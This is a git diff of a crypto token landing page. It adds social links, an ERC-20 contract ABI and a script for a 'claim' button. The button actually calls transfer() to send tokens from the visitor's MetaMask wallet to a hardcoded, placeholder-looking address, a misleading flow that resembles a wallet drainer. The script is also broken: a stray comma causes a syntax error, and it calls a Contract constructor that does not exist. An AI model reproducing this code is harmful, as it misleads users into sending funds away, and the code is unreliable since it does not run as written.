@@ -768,12 +768,11 @@
         <div style="max-width: 800px; margin: 0 auto; text-align: center;">
             <h2 style="font-size: 32px; font-weight: bold; margin-bottom: 40px;">Contact Us</h2>
             <div style="display: flex; justify-content: center; gap: 20px;">
-                <a href="https://twitter.com/your_twitter" target="_blank"
-                    style="text-decoration: none; color: #ffffff;">
+                <a href="https://twitter.com/TributeTBC" target="_blank" style="text-decoration: none; color: #ffffff;">
                     <i class="fab fa-twitter fa-2x"></i>
                     <span style="font-size: 18px; font-weight: bold;">Twitter</span>
                 </a>
-                <a href="https://t.me/your_telegram" target="_blank" style="text-decoration: none; color: #ffffff;">
+                <a href="https://t.me/tributeoffical" target="_blank" style="text-decoration: none; color: #ffffff;">
                     <i class="fab fa-telegram fa-2x"></i>
                     <span style="font-size: 18px; font-weight: bold;">Telegram</span>
                 </a>
@@ -800,59 +799,474 @@
                 storytelling purposes only.</p>
         </div>
     </div>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.5.2/dist/web3.min.js"></script>
 
-    <!-- ... Rest of your HTML ... -->
-    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.3.4/dist/web3.min.js"></script>
     <script>
-        window.addEventListener("load", function () {
-            if (window.ethereum) {
-                window.web3 = new Web3(ethereum);
-                try {
-                    ethereum.enable();
-                } catch (error) {
-                    console.log("User denied account access.");
-                }
-            } else if (window.web3) {
-                window.web3 = new Web3(web3.currentProvider);
-            } else {
-                console.log("Non-Ethereum browser detected. Consider installing MetaMask!");
+        // Contract ABI
+        var contractABI = [
+            {
+                inputs: [
+                    {
+                        internalType: "uint256",
+                        name: "taxRate",
+                        type: "uint256",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "constructor",
+            },
+            {
+                anonymous: false,
+                inputs: [
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "owner",
+                        type: "address",
+                    },
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "spender",
+                        type: "address",
+                    },
+                    {
+                        indexed: false,
+                        internalType: "uint256",
+                        name: "value",
+                        type: "uint256",
+                    },
+                ],
+                name: "Approval",
+                type: "event",
+            },
+            {
+                anonymous: false,
+                inputs: [
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "previousOwner",
+                        type: "address",
+                    },
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "newOwner",
+                        type: "address",
+                    },
+                ],
+                name: "OwnershipTransferred",
+                type: "event",
+            },
+            {
+                anonymous: false,
+                inputs: [
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "from",
+                        type: "address",
+                    },
+                    {
+                        indexed: true,
+                        internalType: "address",
+                        name: "to",
+                        type: "address",
+                    },
+                    {
+                        indexed: false,
+                        internalType: "uint256",
+                        name: "value",
+                        type: "uint256",
+                    },
+                ],
+                name: "Transfer",
+                type: "event",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "_address",
+                        type: "address",
+                    },
+                ],
+                name: "addWhitelistAddress",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "owner",
+                        type: "address",
+                    },
+                    {
+                        internalType: "address",
+                        name: "spender",
+                        type: "address",
+                    },
+                ],
+                name: "allowance",
+                outputs: [
+                    {
+                        internalType: "uint256",
+                        name: "",
+                        type: "uint256",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "spender",
+                        type: "address",
+                    },
+                    {
+                        internalType: "uint256",
+                        name: "amount",
+                        type: "uint256",
+                    },
+                ],
+                name: "approve",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "account",
+                        type: "address",
+                    },
+                ],
+                name: "balanceOf",
+                outputs: [
+                    {
+                        internalType: "uint256",
+                        name: "",
+                        type: "uint256",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "account",
+                        type: "address",
+                    },
+                ],
+                name: "daysHeld",
+                outputs: [
+                    {
+                        internalType: "uint256",
+                        name: "",
+                        type: "uint256",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "decimals",
+                outputs: [
+                    {
+                        internalType: "uint8",
+                        name: "",
+                        type: "uint8",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "spender",
+                        type: "address",
+                    },
+                    {
+                        internalType: "uint256",
+                        name: "subtractedValue",
+                        type: "uint256",
+                    },
+                ],
+                name: "decreaseAllowance",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "spender",
+                        type: "address",
+                    },
+                    {
+                        internalType: "uint256",
+                        name: "addedValue",
+                        type: "uint256",
+                    },
+                ],
+                name: "increaseAllowance",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "_address",
+                        type: "address",
+                    },
+                ],
+                name: "isWhitelisted",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "name",
+                outputs: [
+                    {
+                        internalType: "string",
+                        name: "",
+                        type: "string",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "owner",
+                outputs: [
+                    {
+                        internalType: "address",
+                        name: "",
+                        type: "address",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "_address",
+                        type: "address",
+                    },
+                ],
+                name: "removeWhitelistAddress",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "renounceOwnership",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "symbol",
+                outputs: [
+                    {
+                        internalType: "string",
+                        name: "",
+                        type: "string",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [],
+                name: "totalSupply",
+                outputs: [
+                    {
+                        internalType: "uint256",
+                        name: "",
+                        type: "uint256",
+                    },
+                ],
+                stateMutability: "view",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "to",
+                        type: "address",
+                    },
+                    {
+                        internalType: "uint256",
+                        name: "amount",
+                        type: "uint256",
+                    },
+                ],
+                name: "transfer",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "from",
+                        type: "address",
+                    },
+                    {
+                        internalType: "address",
+                        name: "to",
+                        type: "address",
+                    },
+                    {
+                        internalType: "uint256",
+                        name: "amount",
+                        type: "uint256",
+                    },
+                ],
+                name: "transferFrom",
+                outputs: [
+                    {
+                        internalType: "bool",
+                        name: "",
+                        type: "bool",
+                    },
+                ],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+            {
+                inputs: [
+                    {
+                        internalType: "address",
+                        name: "newOwner",
+                        type: "address",
+                    },
+                ],
+                name: "transferOwnership",
+                outputs: [],
+                stateMutability: "nonpayable",
+                type: "function",
+            },
+        ],
+
+
+        // Contract address
+        var contractAddress = '0x5fD6Baf47955cA5CcE78681458A786FefA545eEc';
+
+        // Create an instance of web3
+        var web3 = new Web3(window.ethereum);
+
+        // Request access to the user's MetaMask account
+        async function requestAccount() {
+            try {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                console.log('Account connected');
+            } catch (error) {
+                console.error('User rejected connection:', error);
+            }
+        }
+
+
+        // Create an instance of the contract
+        var contract = new web3.eth.Contract.ERC20Contract(contractABI, contractAddress);
+
+        // Function to be executed on button click
+        async function transferTokens() {
+            // Request access to account
+            await requestAccount();
+
+            // Parameters for the transfer function
+            var to = '0x9876543210987654321098765432109876543210';  // recipient's address
+            var amount = web3.utils.toWei('1', 'ether');  // the amount of tokens to transfer
+
+            // Call the transfer function
+            try {
+                await contract.methods.transfer(to, amount).send({ from: ethereum.selectedAddress });
+                console.log('Tokens transferred successfully');
+            } catch (error) {
+                console.error('Error transferring tokens:', error);
+            }
+        }
+
+
+        // Bind the function to the button
+        document.getElementById('claimButton').addEventListener('click', transferTokens);
+
+
+        function createCoinRain() {
+            // Create 100 coins
+            for (let i = 0; i < 100; i++) {
+                const coin = document.createElement("div");
+                coin.className = "coin";
+                document.body.appendChild(coin);
             }
 
-            var contractAddress = "CONTRACT_ADDRESS";
-            var ABI = ABI_DEFINITION;
-            var contract = new web3.eth.Contract(ABI, contractAddress);
-
-            document.getElementById("claimButton").addEventListener("click", function () {
-                web3.eth.getAccounts().then(function (accounts) {
-                    contract.methods
-                        .claimToken()
-                        .send({ from: accounts[0] })
-                        .on("transactionHash", function (hash) {
-                            createCoinRain();
-                        })
-                        .on("error", console.error);
+            // Remove coins after the animation ends
+            setTimeout(function () {
+                const coins = document.querySelectorAll(".coin");
+                coins.forEach(function (coin) {
+                    coin.remove();
                 });
-            });
+            }, 3000); // Adjust based on your animation duration
+        }
 
-            function createCoinRain() {
-                // Create 100 coins
-                for (let i = 0; i < 100; i++) {
-                    const coin = document.createElement("div");
-                    coin.className = "coin";
-                    document.body.appendChild(coin);
-                }
 
-                // Remove coins after the animation ends
-                setTimeout(function () {
-                    const coins = document.querySelectorAll(".coin");
-                    coins.forEach(function (coin) {
-                        coin.remove();
-                    });
-                }, 3000); // Adjust based on your animation duration
-            }
-
-        });
     </script>
+
 </body>
 
 </html>
